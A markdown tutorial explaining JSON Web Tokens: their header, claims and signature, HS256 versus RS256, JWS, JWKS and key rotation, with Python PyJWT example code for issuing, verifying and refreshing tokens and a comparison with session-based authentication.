# JWT (JSON Web Token)


## Youtube

- [JWT Explained | JWT vs SessionID | JSON Web Token | Security Challenges with JWT & its Handling](https://www.youtube.com/watch?v=gjVYRl167RQ)




## Theory

### What is JWT (JSON Web Token)?

**JWT** is a compact, URL-safe token format for securely transmitting information between parties as a JSON object. It's digitally signed (and optionally encrypted) to verify authenticity and integrity.

**Key Characteristics:**
- **Self-contained**: Contains all necessary user information (no database lookup needed)
- **Stateless**: Server doesn't need to store session data
- **Compact**: Small size, easy to pass in HTTP headers/URLs
- **Signed**: Cryptographically verified for authenticity
- **Standardized**: RFC 7519 specification

**Common Use Cases:**
- Authentication (login sessions)
- Single Sign-On (SSO)
- API authorization
- Information exchange
- Mobile app authentication

---

## JWT Structure

A JWT consists of three parts separated by dots (`.`):

```
┌────────────────────────────────────────────────────────────────┐
│                         JWT Structure                          │
├────────────────────────────────────────────────────────────────┤
│                                                                 │
│  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.                        │
│  ─────────────────────────────────────                         │
│         HEADER (Base64URL)                                      │
│                                                                 │
│  eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0Ijo │
│  xNTE2MjM5MDIyfQ.                                              │
│  ──────────────────────────────────────────────────            │
│         PAYLOAD (Base64URL)                                     │
│                                                                 │
│  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                   │
│  ───────────────────────────────────────────                   │
│         SIGNATURE (Base64URL)                                   │
│                                                                 │
└────────────────────────────────────────────────────────────────┘

Format: HEADER.PAYLOAD.SIGNATURE
```

### Complete Example

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

When decoded:

HEADER:
{
  "alg": "HS256",
  "typ": "JWT"
}

PAYLOAD:
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}

SIGNATURE:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

---

## Part 1: Header

The header typically consists of two parts:
1. **Token type** (`typ`): "JWT"
2. **Signing algorithm** (`alg`): HS256, RS256, etc.

### Common Header Properties

```json
{
  "alg": "HS256",        // Algorithm (REQUIRED)
  "typ": "JWT",          // Type (OPTIONAL but recommended)
  "kid": "key-id-123",   // Key ID (for key rotation)
  "cty": "JWT",          // Content type (for nested JWTs)
  "jku": "https://...",  // JWK Set URL
  "x5u": "https://...",  // X.509 URL
  "x5c": ["cert1"],      // X.509 certificate chain
  "x5t": "thumb...",     // X.509 thumbprint (SHA-1)
  "x5t#S256": "..."      // X.509 thumbprint (SHA-256)
}
```

### Common Algorithms

| Algorithm | Type | Description | Key Length |
|-----------|------|-------------|------------|
| **HS256** | HMAC | SHA-256 symmetric signing | 256 bits |
| **HS384** | HMAC | SHA-384 symmetric signing | 384 bits |
| **HS512** | HMAC | SHA-512 symmetric signing | 512 bits |
| **RS256** | RSA | SHA-256 asymmetric signing | 2048+ bits |
| **RS384** | RSA | SHA-384 asymmetric signing | 2048+ bits |
| **RS512** | RSA | SHA-512 asymmetric signing | 2048+ bits |
| **ES256** | ECDSA | SHA-256 with P-256 curve | 256 bits |
| **ES384** | ECDSA | SHA-384 with P-384 curve | 384 bits |
| **ES512** | ECDSA | SHA-512 with P-521 curve | 521 bits |
| **PS256** | RSA-PSS | SHA-256 with MGF1 | 2048+ bits |
| **none** | None | ⚠️ Unsecured (NOT recommended) | N/A |

---

## Part 2: Payload (Claims)

The payload contains **claims** - statements about an entity (typically the user) and additional metadata.

### Types of Claims

```
┌─────────────────────────────────────────────────────────────┐
│                      Claim Types                            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. REGISTERED CLAIMS (Reserved, standardized)              │
│     ─────────────────────────────────────────               │
│     • iss (Issuer)                                          │
│     • sub (Subject)                                         │
│     • aud (Audience)                                        │
│     • exp (Expiration Time)                                 │
│     • nbf (Not Before)                                      │
│     • iat (Issued At)                                       │
│     • jti (JWT ID)                                          │
│                                                              │
│  2. PUBLIC CLAIMS (Collision-resistant, should be in IANA)  │
│     ─────────────────────────────────────────               │
│     • name, email, phone, address, etc.                     │
│     • Should use URIs to avoid collision                    │
│                                                              │
│  3. PRIVATE CLAIMS (Custom, application-specific)           │
│     ─────────────────────────────────────────               │
│     • user_id, role, permissions                            │
│     • organization_id, tenant_id                            │
│     • Any custom data                                       │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Registered Claims (Detailed)

```json
{
  // Issuer: Who created and signed the token
  "iss": "https://auth.example.com",
  
  // Subject: Whom the token refers to (usually user ID)
  "sub": "user123",
  
  // Audience: Who the token is intended for
  "aud": ["https://api.example.com", "https://app.example.com"],
  
  // Expiration Time: When token expires (Unix timestamp)
  "exp": 1735689600,  // 2025-01-01 00:00:00 UTC
  
  // Not Before: Token not valid before this time
  "nbf": 1735603200,  // 2024-12-31 00:00:00 UTC
  
  // Issued At: When token was created
  "iat": 1735603200,  // 2024-12-31 00:00:00 UTC
  
  // JWT ID: Unique identifier for this token
  "jti": "550e8400-e29b-41d4-a716-446655440000"
}
```

### Complete Payload Example

```json
{
  // Registered claims
  "iss": "https://auth.myapp.com",
  "sub": "user_12345",
  "aud": "https://api.myapp.com",
  "exp": 1735689600,
  "iat": 1735603200,
  "jti": "abc-123-xyz",
  
  // Public claims
  "name": "John Doe",
  "email": "john@example.com",
  "email_verified": true,
  "phone_number": "+1234567890",
  "picture": "https://example.com/photo.jpg",
  
  // Private claims
  "user_id": 12345,
  "role": "admin",
  "permissions": ["read", "write", "delete"],
  "organization_id": "org_789",
  "department": "Engineering",
  "subscription_tier": "premium"
}
```

### Claim Validation Rules

```python
def validate_claims(payload, config):
    """Validate JWT claims"""
    now = int(time.time())
    
    # 1. Expiration Time (exp)
    if 'exp' in payload:
        if payload['exp'] < now:
            raise ValueError("Token has expired")
    
    # 2. Not Before (nbf)
    if 'nbf' in payload:
        if payload['nbf'] > now:
            raise ValueError("Token not yet valid")
    
    # 3. Issuer (iss)
    if 'iss' in payload:
        if payload['iss'] not in config['allowed_issuers']:
            raise ValueError("Invalid issuer")
    
    # 4. Audience (aud)
    if 'aud' in payload:
        audiences = payload['aud'] if isinstance(payload['aud'], list) else [payload['aud']]
        if config['expected_audience'] not in audiences:
            raise ValueError("Invalid audience")
    
    # 5. Issued At (iat) - check if too old
    if 'iat' in payload:
        max_age = config.get('max_token_age', 86400)  # 24 hours
        if (now - payload['iat']) > max_age:
            raise ValueError("Token too old")
    
    return True
```

---

## Part 3: Signature

The signature ensures the token hasn't been tampered with. It's created by encoding the header and payload, then signing with a secret or private key.

### Signature Creation Process

```
┌─────────────────────────────────────────────────────────────┐
│             Signature Creation (HS256)                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Step 1: Encode Header                                      │
│  ──────────────────────                                     │
│  Header JSON → Base64URL Encode                             │
│  {"alg":"HS256","typ":"JWT"}                                │
│           ↓                                                  │
│  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9                       │
│                                                              │
│  Step 2: Encode Payload                                     │
│  ───────────────────────                                    │
│  Payload JSON → Base64URL Encode                            │
│  {"sub":"123","name":"John"}                                │
│           ↓                                                  │
│  eyJzdWIiOiIxMjMiLCJuYW1lIjoiSm9obiJ9                       │
│                                                              │
│  Step 3: Create Signature Input                             │
│  ──────────────────────────────                             │
│  encodedHeader + "." + encodedPayload                       │
│           ↓                                                  │
│  eyJhbGci...J9.eyJzdWIi...obiJ9                             │
│                                                              │
│  Step 4: Sign with Secret                                   │
│  ─────────────────────────                                  │
│  HMAC-SHA256(signatureInput, secret)                        │
│           ↓                                                  │
│  Raw signature bytes                                         │
│                                                              │
│  Step 5: Base64URL Encode Signature                         │
│  ───────────────────────────────────                        │
│  Signature bytes → Base64URL Encode                         │
│           ↓                                                  │
│  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                │
│                                                              │
│  Final JWT:                                                  │
│  eyJhbGci...J9.eyJzdWIi...obiJ9.SflKxw...dQssw5c            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### HMAC vs RSA Signatures

```
┌──────────────────────────────────────────────────────────────┐
│             HMAC (Symmetric) - HS256                         │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  Same secret key for signing AND verifying                   │
│                                                               │
│  ┌──────────────┐      Secret Key: "mySecret123"            │
│  │   Issuer     │                                            │
│  │ (Auth Server)│      HMAC-SHA256(data, secret)            │
│  └──────┬───────┘              ↓                             │
│         │                  Signature                          │
│         │ Creates JWT                                        │
│         ▼                                                     │
│  eyJhbGci...SflKxwRJ                                         │
│         │                                                     │
│         │ Sends JWT                                          │
│         ▼                                                     │
│  ┌──────────────┐      Secret Key: "mySecret123"            │
│  │   Verifier   │                                            │
│  │ (API Server) │      HMAC-SHA256(data, secret)            │
│  └──────────────┘              ↓                             │
│                            Verify matches                     │
│                                                               │
│  ⚠️  Problem: Both parties need the same secret!            │
│      If API server is compromised, it can forge tokens       │
│                                                               │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│             RSA (Asymmetric) - RS256                         │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  Private key for signing, Public key for verifying           │
│                                                               │
│  ┌──────────────┐      Private Key (kept secret)            │
│  │   Issuer     │                                            │
│  │ (Auth Server)│      RSA-SHA256(data, privateKey)         │
│  └──────┬───────┘              ↓                             │
│         │                  Signature                          │
│         │ Creates JWT                                        │
│         ▼                                                     │
│  eyJhbGci...SflKxwRJ                                         │
│         │                                                     │
│         │ Sends JWT                                          │
│         ▼                                                     │
│  ┌──────────────┐      Public Key (can be shared)           │
│  │   Verifier   │                                            │
│  │ (API Server) │      RSA-Verify(data, signature, pubKey)  │
│  └──────────────┘              ↓                             │
│                            Verify matches                     │
│                                                               │
│  ✅ Better Security: API server CANNOT create tokens        │
│     Only auth server with private key can sign               │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

---

## JWT Issuance Flow

### Complete Authentication Flow

```
┌──────────┐                                              ┌──────────────┐
│  Client  │                                              │ Auth Server  │
│ (Browser)│                                              │   (Issuer)   │
└────┬─────┘                                              └──────┬───────┘
     │                                                            │
     │  1. Login Request (POST /login)                           │
     │    {username: "john", password: "secret"}                 │
     ├──────────────────────────────────────────────────────────>│
     │                                                            │
     │                                   2. Validate Credentials │
     │                                      ✓ Check DB           │
     │                                      ✓ Verify password    │
     │                                            │               │
     │                                   3. Create JWT           │
     │                                      ┌──────────────┐     │
     │                                      │ HEADER       │     │
     │                                      │ {"alg":"RS256"}    │
     │                                      └──────────────┘     │
     │                                      ┌──────────────┐     │
     │                                      │ PAYLOAD      │     │
     │                                      │ {sub: "123"} │     │
     │                                      │ {exp: ...}   │     │
     │                                      └──────────────┘     │
     │                                      ┌──────────────┐     │
     │                                      │ SIGNATURE    │     │
     │                                      │ (with priv key)    │
     │                                      └──────────────┘     │
     │                                            │               │
     │  4. Return JWT                                            │
     │  {token: "eyJhbGci...", expiresIn: 3600}                  │
     │<──────────────────────────────────────────────────────────┤
     │                                                            │
     │  5. Store JWT (localStorage/cookie)                       │
     │  ✅ Saved                                                 │
     │                                                            │
     ▼                                                            ▼


┌──────────┐                                              ┌──────────────┐
│  Client  │                                              │  API Server  │
│ (Browser)│                                              │  (Resource)  │
└────┬─────┘                                              └──────┬───────┘
     │                                                            │
     │  6. API Request with JWT                                  │
     │  GET /api/user/profile                                    │
     │  Authorization: Bearer eyJhbGci...                        │
     ├──────────────────────────────────────────────────────────>│
     │                                                            │
     │                                   7. Verify JWT           │
     │                                      ┌──────────────┐     │
     │                                      │ Extract JWT  │     │
     │                                      └──────┬───────┘     │
     │                                             │              │
     │                                      ┌──────▼───────┐     │
     │                                      │ Split into   │     │
     │                                      │ Header.      │     │
     │                                      │ Payload.     │     │
     │                                      │ Signature    │     │
     │                                      └──────┬───────┘     │
     │                                             │              │
     │                                      ┌──────▼───────┐     │
     │                                      │ Get Public   │     │
     │                                      │ Key (JWKS)   │     │
     │                                      └──────┬───────┘     │
     │                                             │              │
     │                                      ┌──────▼───────┐     │
     │                                      │ Verify       │     │
     │                                      │ Signature    │     │
     │                                      └──────┬───────┘     │
     │                                             │              │
     │                                      ┌──────▼───────┐     │
     │                                      │ Validate     │     │
     │                                      │ Claims       │     │
     │                                      │ (exp, aud)   │     │
     │                                      └──────┬───────┘     │
     │                                             │              │
     │                                      ✅ Valid             │
     │                                             │              │
     │  8. Return Protected Resource                             │
     │  {id: 123, name: "John", email: "..."}                    │
     │<──────────────────────────────────────────────────────────┤
     │                                                            │
     └────────────────────────────────────────────────────────────┘
```

---

## JWS (JSON Web Signature)

**JWS** is the specification (RFC 7515) that defines how to digitally sign content using JSON. **JWT is actually a type of JWS** with JSON claims in the payload.

### JWS Structure

```
┌────────────────────────────────────────────────────────────┐
│                    JWS Components                          │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  1. JOSE Header (JSON Object Signing and Encryption)       │
│     ────────────────────────────────────────               │
│     Contains metadata about the signature                  │
│     {"alg": "RS256", "typ": "JWT", "kid": "key-123"}      │
│                                                             │
│  2. JWS Payload                                            │
│     ────────────                                           │
│     The actual content being signed                        │
│     Can be ANY content (not just JWT claims)               │
│                                                             │
│  3. JWS Signature                                          │
│     ──────────────                                         │
│     Digital signature of header + payload                  │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### JWS Serialization Formats

**1. Compact Serialization (Most Common):**
```
BASE64URL(UTF8(JWS Header)) || '.' ||
BASE64URL(JWS Payload) || '.' ||
BASE64URL(JWS Signature)

Example:
eyJhbGci...J9.eyJzdWI...iJ9.SflKxw...ssw5c
```

**2. JSON Serialization (Multiple Signatures):**
```json
{
  "payload": "eyJzdWI...",
  "signatures": [
    {
      "protected": "eyJhbGci...",
      "header": {"kid": "key-1"},
      "signature": "DtEhU3..."
    },
    {
      "protected": "eyJhbGci...",
      "header": {"kid": "key-2"},
      "signature": "8BYT5X..."
    }
  ]
}
```

### JWS vs JWT

```
┌────────────────────────────────────────────────────────────┐
│                       JWS vs JWT                           │
├──────────────┬─────────────────────────────────────────────┤
│     JWS      │  Specification for signing JSON content     │
│              │  Can sign ANY payload                       │
│              │  RFC 7515                                   │
├──────────────┼─────────────────────────────────────────────┤
│     JWT      │  Specific use of JWS for authentication     │
│              │  Payload MUST be JSON claims                │
│              │  RFC 7519                                   │
├──────────────┼─────────────────────────────────────────────┤
│ Relationship │  JWT is a JWS with claims as payload       │
│              │  Every JWT is a JWS                         │
│              │  Not every JWS is a JWT                     │
└──────────────┴─────────────────────────────────────────────┘
```

---

## JWKS (JSON Web Key Set)

**JWKS** is a set of public keys used to verify JWTs issued by an authorization server. It's typically exposed as a JSON document at a well-known URL.

### JWKS Structure

```json
{
  "keys": [
    {
      // Key Type
      "kty": "RSA",
      
      // Public Key Use
      "use": "sig",
      
      // Key ID (for key rotation)
      "kid": "key-2024-01",
      
      // Algorithm
      "alg": "RS256",
      
      // RSA Public Key Components
      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAt...",
      "e": "AQAB",
      
      // X.509 Certificate Chain (optional)
      "x5c": ["MIIDQjCCAiqgAwIBAgIGATz..."],
      
      // X.509 Thumbprint
      "x5t": "GF8IDz...",
      "x5t#S256": "jMI7H..."
    },
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "key-2024-02",
      "alg": "RS256",
      "n": "xjlw2VhYs...",
      "e": "AQAB"
    }
  ]
}
```

### JWKS Properties

| Property | Description | Example |
|----------|-------------|---------|
| **kty** | Key Type | "RSA", "EC", "oct" |
| **use** | Public Key Use | "sig" (signature), "enc" (encryption) |
| **key_ops** | Key Operations | ["sign", "verify"] |
| **alg** | Algorithm | "RS256", "ES256" |
| **kid** | Key ID (unique identifier) | "key-2024-01" |
| **n** | RSA modulus (Base64URL) | "0vx7ago..." |
| **e** | RSA exponent | "AQAB" (65537) |
| **x5c** | X.509 certificate chain | ["MIID..."] |
| **x5t** | X.509 SHA-1 thumbprint | "GF8IDz..." |
| **x5t#S256** | X.509 SHA-256 thumbprint | "jMI7H..." |
| **crv** | Elliptic Curve (for EC) | "P-256", "P-384" |
| **x** | EC x coordinate | "f83OJ3..." |
| **y** | EC y coordinate | "x_FEzR..." |

### JWKS Endpoint Discovery

```
┌────────────────────────────────────────────────────────────┐
│            OpenID Connect Discovery Flow                   │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  Step 1: Discover OpenID Configuration                     │
│  ──────────────────────────────────────                    │
│  GET https://auth.example.com/.well-known/openid-configuration
│                                                             │
│  Response:                                                  │
│  {                                                          │
│    "issuer": "https://auth.example.com",                   │
│    "authorization_endpoint": "https://auth.../authorize",  │
│    "token_endpoint": "https://auth.../token",              │
│    "jwks_uri": "https://auth.../jwks.json",  ← Important! │
│    "response_types_supported": ["code", "token"],          │
│    ...                                                      │
│  }                                                          │
│                                                             │
│  Step 2: Fetch JWKS                                        │
│  ───────────────────                                       │
│  GET https://auth.example.com/jwks.json                    │
│                                                             │
│  Response:                                                  │
│  {                                                          │
│    "keys": [                                               │
│      {"kty": "RSA", "kid": "key-1", "n": "...", "e": "..."} │
│    ]                                                        │
│  }                                                          │
│                                                             │
│  Step 3: Verify JWT                                        │
│  ───────────────────                                       │
│  1. Parse JWT header → get "kid"                           │
│  2. Find matching key in JWKS                              │
│  3. Verify signature with public key                       │
│  4. Validate claims                                        │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### JWKS Key Rotation

```
Key Rotation Strategy:

Time: Day 0                    Day 30                  Day 60
      │                         │                        │
      ▼                         ▼                        ▼
┌──────────┐             ┌──────────┐             ┌──────────┐
│  JWKS    │             │  JWKS    │             │  JWKS    │
│          │             │          │             │          │
│ key-jan  │ ← Active    │ key-jan  │             │ key-feb  │
│          │             │ key-feb  │ ← Active    │ key-mar  │ ← Active
│          │             │          │             │          │
└──────────┘             └──────────┘             └──────────┘

Process:
1. Generate new key (key-feb) on Day 25
2. Add to JWKS alongside old key (key-jan)
3. Start signing with new key on Day 30
4. Keep old key for verification (grace period)
5. Remove old key after all JWTs expire (Day 60)

Benefits:
✅ Zero downtime during rotation
✅ Old JWTs still valid during transition
✅ Security: Limit key exposure window
```

---

## Complete Python Implementation

### Installation

```bash
pip install pyjwt cryptography
```

### Creating and Verifying JWTs

```python
import jwt
import json
import time
from datetime import datetime, timedelta
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# ============================================================
# 1. HMAC (HS256) - Symmetric Signing
# ============================================================

class JWTServiceHS256:
    """JWT service using HMAC-SHA256 (symmetric)"""
    
    def __init__(self, secret_key: str):
        self.secret = secret_key
        self.algorithm = "HS256"
    
    def create_token(self, user_id: str, email: str, 
                    role: str = "user", expires_in: int = 3600):
        """
        Create a JWT token.
        
        Args:
            user_id: Unique user identifier
            email: User email
            role: User role (admin, user, etc.)
            expires_in: Token lifetime in seconds
        
        Returns:
            JWT token string
        """
        now = datetime.utcnow()
        
        # Define payload claims
        payload = {
            # Registered claims
            "iss": "https://auth.myapp.com",  # Issuer
            "sub": user_id,                    # Subject (user ID)
            "aud": "https://api.myapp.com",   # Audience
            "exp": now + timedelta(seconds=expires_in),  # Expiration
            "iat": now,                        # Issued at
            "nbf": now,                        # Not before
            "jti": f"jwt_{user_id}_{int(time.time())}",  # JWT ID
            
            # Public claims
            "email": email,
            "email_verified": True,
            
            # Private claims
            "role": role,
            "permissions": ["read", "write"] if role == "admin" else ["read"]
        }
        
        # Create JWT
        token = jwt.encode(
            payload,
            self.secret,
            algorithm=self.algorithm
        )
        
        return token
    
    def verify_token(self, token: str, expected_audience: str = None):
        """
        Verify and decode a JWT token.
        
        Args:
            token: JWT token string
            expected_audience: Expected audience value
        
        Returns:
            Decoded payload dictionary
        """
        try:
            # Verify and decode
            payload = jwt.decode(
                token,
                self.secret,
                algorithms=[self.algorithm],
                audience=expected_audience,
                options={
                    "verify_signature": True,
                    "verify_exp": True,
                    "verify_nbf": True,
                    "verify_iat": True,
                    "verify_aud": True if expected_audience else False
                }
            )
            
            return {
                "valid": True,
                "payload": payload
            }
        
        except jwt.ExpiredSignatureError:
            return {"valid": False, "error": "Token has expired"}
        
        except jwt.InvalidTokenError as e:
            return {"valid": False, "error": str(e)}
    
    def decode_without_verification(self, token: str):
        """Decode token without verifying (for debugging)"""
        return jwt.decode(token, options={"verify_signature": False})


# Example Usage: HS256
print("=" * 60)
print("HMAC-SHA256 (HS256) Example")
print("=" * 60)

jwt_service = JWTServiceHS256(secret_key="my-super-secret-key-keep-this-safe")

# Create token
token = jwt_service.create_token(
    user_id="user_12345",
    email="john@example.com",
    role="admin",
    expires_in=3600  # 1 hour
)

print(f"\n✅ Generated JWT:\n{token}\n")

# Decode header and payload (without verification)
parts = token.split('.')
print(f"Parts: {len(parts)} (Header.Payload.Signature)\n")

# Verify token
result = jwt_service.verify_token(token, expected_audience="https://api.myapp.com")
print(f"✅ Verification Result:")
print(f"Valid: {result['valid']}")
if result['valid']:
    print(f"User ID: {result['payload']['sub']}")
    print(f"Email: {result['payload']['email']}")
    print(f"Role: {result['payload']['role']}")
    print(f"Expires: {datetime.fromtimestamp(result['payload']['exp'])}")


# ============================================================
# 2. RSA (RS256) - Asymmetric Signing
# ============================================================

class JWTServiceRS256:
    """JWT service using RSA-SHA256 (asymmetric)"""
    
    def __init__(self):
        # Generate RSA key pair
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()
        self.algorithm = "RS256"
        self.kid = "key-2024-01"
    
    def create_token(self, user_id: str, email: str, 
                    role: str = "user", expires_in: int = 3600):
        """Create JWT with RSA signature"""
        now = datetime.utcnow()
        
        payload = {
            "iss": "https://auth.myapp.com",
            "sub": user_id,
            "aud": "https://api.myapp.com",
            "exp": now + timedelta(seconds=expires_in),
            "iat": now,
            "email": email,
            "role": role
        }
        
        # Add kid to header
        headers = {"kid": self.kid}
        
        # Sign with private key
        private_pem = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        token = jwt.encode(
            payload,
            private_pem,
            algorithm=self.algorithm,
            headers=headers
        )
        
        return token
    
    def verify_token(self, token: str):
        """Verify JWT with public key"""
        try:
            # Get public key PEM
            public_pem = self.public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            # Verify with public key
            payload = jwt.decode(
                token,
                public_pem,
                algorithms=[self.algorithm]
            )
            
            return {"valid": True, "payload": payload}
        
        except jwt.InvalidTokenError as e:
            return {"valid": False, "error": str(e)}
    
    def get_jwks(self):
        """Generate JWKS (JSON Web Key Set)"""
        from cryptography.hazmat.primitives.asymmetric import rsa
        
        # Get public key numbers
        public_numbers = self.public_key.public_numbers()
        
        # Convert to base64url
        import base64
        
        def int_to_base64url(num):
            """Convert integer to base64url"""
            num_bytes = num.to_bytes((num.bit_length() + 7) // 8, 'big')
            return base64.urlsafe_b64encode(num_bytes).decode('utf-8').rstrip('=')
        
        jwks = {
            "keys": [
                {
                    "kty": "RSA",
                    "use": "sig",
                    "kid": self.kid,
                    "alg": "RS256",
                    "n": int_to_base64url(public_numbers.n),
                    "e": int_to_base64url(public_numbers.e)
                }
            ]
        }
        
        return jwks


# Example Usage: RS256
print("\n" + "=" * 60)
print("RSA-SHA256 (RS256) Example")
print("=" * 60)

jwt_service_rsa = JWTServiceRS256()

# Create token
token_rsa = jwt_service_rsa.create_token(
    user_id="user_67890",
    email="alice@example.com",
    role="user",
    expires_in=7200  # 2 hours
)

print(f"\n✅ Generated JWT (RS256):\n{token_rsa}\n")

# Verify token
result_rsa = jwt_service_rsa.verify_token(token_rsa)
print(f"✅ Verification Result:")
print(f"Valid: {result_rsa['valid']}")
if result_rsa['valid']:
    print(f"User ID: {result_rsa['payload']['sub']}")
    print(f"Email: {result_rsa['payload']['email']}")

# Get JWKS
jwks = jwt_service_rsa.get_jwks()
print(f"\n✅ JWKS (Public Key Set):")
print(json.dumps(jwks, indent=2))


# ============================================================
# 3. Complete Authentication System
# ============================================================

class AuthenticationService:
    """Complete authentication service with JWT"""
    
    def __init__(self, secret_key: str):
        self.jwt_service = JWTServiceHS256(secret_key)
        self.refresh_tokens = {}  # In production, use Redis/DB
    
    def login(self, username: str, password: str):
        """
        Authenticate user and return tokens.
        
        Returns:
            dict with access_token and refresh_token
        """
        # In production: verify against database
        if username == "admin" and password == "admin123":
            user_id = "user_001"
            email = "admin@example.com"
            role = "admin"
        elif username == "user" and password == "user123":
            user_id = "user_002"
            email = "user@example.com"
            role = "user"
        else:
            return {"success": False, "error": "Invalid credentials"}
        
        # Create access token (short-lived)
        access_token = self.jwt_service.create_token(
            user_id=user_id,
            email=email,
            role=role,
            expires_in=900  # 15 minutes
        )
        
        # Create refresh token (long-lived)
        refresh_token = self.jwt_service.create_token(
            user_id=user_id,
            email=email,
            role=role,
            expires_in=604800  # 7 days
        )
        
        # Store refresh token
        self.refresh_tokens[user_id] = refresh_token
        
        return {
            "success": True,
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 900
        }
    
    def refresh_access_token(self, refresh_token: str):
        """Generate new access token from refresh token"""
        # Verify refresh token
        result = self.jwt_service.verify_token(refresh_token)
        
        if not result['valid']:
            return {"success": False, "error": "Invalid refresh token"}
        
        user_id = result['payload']['sub']
        
        # Check if refresh token is in our store
        if user_id not in self.refresh_tokens:
            return {"success": False, "error": "Refresh token not found"}
        
        # Create new access token
        new_access_token = self.jwt_service.create_token(
            user_id=user_id,
            email=result['payload']['email'],
            role=result['payload']['role'],
            expires_in=900
        )
        
        return {
            "success": True,
            "access_token": new_access_token,
            "token_type": "Bearer",
            "expires_in": 900
        }
    
    def logout(self, user_id: str):
        """Logout user by removing refresh token"""
        if user_id in self.refresh_tokens:
            del self.refresh_tokens[user_id]
        return {"success": True}
    
    def validate_request(self, authorization_header: str):
        """Validate API request with Bearer token"""
        if not authorization_header:
            return {"valid": False, "error": "No authorization header"}
        
        # Extract token from "Bearer <token>"
        parts = authorization_header.split()
        if len(parts) != 2 or parts[0] != "Bearer":
            return {"valid": False, "error": "Invalid authorization header"}
        
        token = parts[1]
        
        # Verify token
        return self.jwt_service.verify_token(
            token,
            expected_audience="https://api.myapp.com"
        )


# Example Usage: Complete Auth Flow
print("\n" + "=" * 60)
print("Complete Authentication Flow")
print("=" * 60)

auth_service = AuthenticationService(secret_key="my-app-secret-key-2024")

# Step 1: Login
print("\n1️⃣ User Login")
login_result = auth_service.login("admin", "admin123")
if login_result['success']:
    print(f"✅ Login successful")
    print(f"Access Token: {login_result['access_token'][:50]}...")
    print(f"Refresh Token: {login_result['refresh_token'][:50]}...")
    print(f"Expires in: {login_result['expires_in']} seconds")
    
    access_token = login_result['access_token']
    refresh_token = login_result['refresh_token']

# Step 2: Make API request
print("\n2️⃣ Make API Request")
auth_header = f"Bearer {access_token}"
validation_result = auth_service.validate_request(auth_header)
if validation_result['valid']:
    print(f"✅ Request authorized")
    print(f"User: {validation_result['payload']['email']}")
    print(f"Role: {validation_result['payload']['role']}")

# Step 3: Refresh access token
print("\n3️⃣ Refresh Access Token")
refresh_result = auth_service.refresh_access_token(refresh_token)
if refresh_result['success']:
    print(f"✅ New access token generated")
    print(f"New Token: {refresh_result['access_token'][:50]}...")

# Step 4: Logout
print("\n4️⃣ Logout")
logout_result = auth_service.logout("user_001")
print(f"✅ Logout successful: {logout_result['success']}")
```

---

## JWT vs Session Comparison

```
┌────────────────────────────────────────────────────────────────┐
│                    JWT vs Session-Based Auth                   │
├──────────────────┬─────────────────────────────────────────────┤
│                  │              SESSION-BASED                   │
├──────────────────┼─────────────────────────────────────────────┤
│ Storage          │ Server stores session in DB/Redis           │
│ Scalability      │ ❌ Requires sticky sessions or shared store │
│ Database Lookup  │ ✅ Required for every request               │
│ Stateful         │ ✅ Yes (server maintains state)             │
│ Revocation       │ ✅ Easy (delete session from DB)            │
│ Size             │ Small (session ID only)                     │
│ Security         │ Good (server-controlled)                    │
├──────────────────┼─────────────────────────────────────────────┤
│                  │                 JWT-BASED                    │
├──────────────────┼─────────────────────────────────────────────┤
│ Storage          │ Client stores token (localStorage/cookie)   │
│ Scalability      │ ✅ No server-side storage needed            │
│ Database Lookup  │ ❌ Not required (self-contained)            │
│ Stateless        │ ✅ Yes (server is stateless)                │
│ Revocation       │ ❌ Difficult (need blacklist or short TTL)  │
│ Size             │ Large (entire payload encoded)              │
│ Security         │ Good (with proper implementation)           │
└──────────────────┴─────────────────────────────────────────────┘
```

### When to Use JWT vs Sessions

**Use JWT When:**
- Building microservices architecture
- Need horizontal scalability
- API is consumed by multiple clients (web, mobile, IoT)
- Cross-domain authentication (CORS)
- Single Sign-On (SSO)

**Use Sessions When:**
- Monolithic application
- Need instant revocation
- Sensitive admin panel
- Small application with single server
- Compliance requires server-side control

---

## JWT Security Best Practices

### 1. **Token Storage**

```javascript
// ❌ BAD: localStorage (vulnerable to XSS)
localStorage.setItem('token', jwt);

// ✅ GOOD: HttpOnly cookie (protected from XSS)
// Server sets cookie:
response.cookie('token', jwt, {
  httpOnly: true,    // Not accessible via JavaScript
  secure: true,      // Only sent over HTTPS
  sameSite: 'strict', // CSRF protection
  maxAge: 3600000    // 1 hour
});
```

